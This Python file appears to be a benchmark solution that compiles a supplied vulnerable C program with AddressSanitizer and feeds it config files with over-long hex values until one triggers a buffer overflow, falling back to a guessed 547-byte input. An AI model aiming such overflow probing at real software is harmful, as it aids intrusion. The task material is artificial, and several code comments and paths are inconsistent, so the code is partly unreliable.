import os
import tempfile
import tarfile
import subprocess
import shutil
from pathlib import Path
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            tmpdir_path = Path(tmpdir)
            
            # Extract source
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Find and compile vulnerable program
            for root, dirs, files in os.walk(tmpdir):
                for file in files:
                    if file.endswith('.c') and 'vuln' in file.lower():
                        source_path = Path(root) / file
                        break
            
            # Compile with sanitizers to detect overflow
            compile_cmd = [
                'gcc', str(source_path), '-o', str(tmpdir_path / 'vuln'),
                '-fsanitize=address', '-g', '-O0'
            ]
            subprocess.run(compile_cmd, capture_output=True, cwd=tmpdir)
            
            # Analyze source to understand config format
            with open(source_path, 'r') as f:
                source_code = f.read()
            
            # Look for hex parsing patterns
            hex_patterns = [
                r'0x[0-9a-fA-F]+',
                r'hex.*=.*[0-9a-fA-F]+',
                r'strtol.*16',
                r'%x',
                r'[0-9a-fA-F]{16,}'
            ]
            
            # Find config file format
            config_lines = []
            for line in source_code.split('\n'):
                if any(re.search(pattern, line, re.IGNORECASE) for pattern in hex_patterns):
                    config_lines.append(line)
            
            # Determine overflow size - target 547 bytes total
            # Create PoC with long hex value that causes buffer overflow
            # Format: key=0x<very_long_hex_value>
            hex_length = 1088  # 544 hex chars + "0x" prefix ~ 547 bytes total
            
            # Generate long hex string
            hex_value = 'A' * hex_length  # Using 'A' (0x41) for predictable overflow
            
            # Common config patterns
            config_templates = [
                f"hex={hex_value}",
                f"value=0x{hex_value}",
                f"config=0x{hex_value}",
                f"data=0x{hex_value}",
                f"input=0x{hex_value}",
                f"buf=0x{hex_value}",
                f"param=0x{hex_value}",
                f"key=0x{hex_value}"
            ]
            
            # Test each template until we find one that causes crash
            for template in config_templates:
                config_data = template.encode()
                
                # Write config to file
                config_path = tmpdir_path / 'config.txt'
                config_path.write_bytes(config_data)
                
                # Run vulnerable program
                vuln_path = tmpdir_path / 'vuln'
                if not vuln_path.exists():
                    continue
                
                try:
                    result = subprocess.run(
                        [str(vuln_path), str(config_path)],
                        capture_output=True,
                        timeout=2,
                        cwd=tmpdir
                    )
                    
                    # Check for crash (non-zero exit code with ASAN error)
                    if result.returncode != 0:
                        if b'AddressSanitizer' in result.stderr or b'stack-overflow' in result.stderr:
                            return config_data
                except subprocess.TimeoutExpired:
                    continue
                except Exception:
                    continue
            
            # If no template worked, try brute force with different hex patterns
            for template in config_templates:
                # Try with different hex content that might trigger specific overflow
                hex_patterns = [
                    'A' * hex_length,  # All 'A's
                    'B' * hex_length,  # All 'B's
                    'C' * hex_length,  # All 'C's
                    '41' * (hex_length // 2),  # Hex representation of 'A'
                    '42' * (hex_length // 2),  # Hex representation of 'B'
                    '41414141' * (hex_length // 8),  # Pattern
                ]
                
                for hex_val in hex_patterns:
                    if '0x' in template:
                        config_data = template.replace(hex_value, hex_val).encode()
                    else:
                        config_data = f"{template.split('=')[0]}=0x{hex_val}".encode()
                    
                    if len(config_data) > 600:  # Keep reasonable size
                        config_data = config_data[:600]
                    
                    config_path = tmpdir_path / 'config.txt'
                    config_path.write_bytes(config_data)
                    
                    try:
                        result = subprocess.run(
                            [str(vuln_path), str(config_path)],
                            capture_output=True,
                            timeout=2,
                            cwd=tmpdir
                        )
                        
                        if result.returncode != 0:
                            if b'AddressSanitizer' in result.stderr:
                                return config_data
                    except:
                        continue
            
            # Fallback: return a PoC that should work based on the description
            # Create a 547-byte PoC with hex value
            target_size = 547
            hex_content = '41' * ((target_size - 5) // 2)  # Account for "hex=0x" prefix
            fallback_poc = f"hex=0x{hex_content}".encode()[:target_size]
            
            return fallback_poc
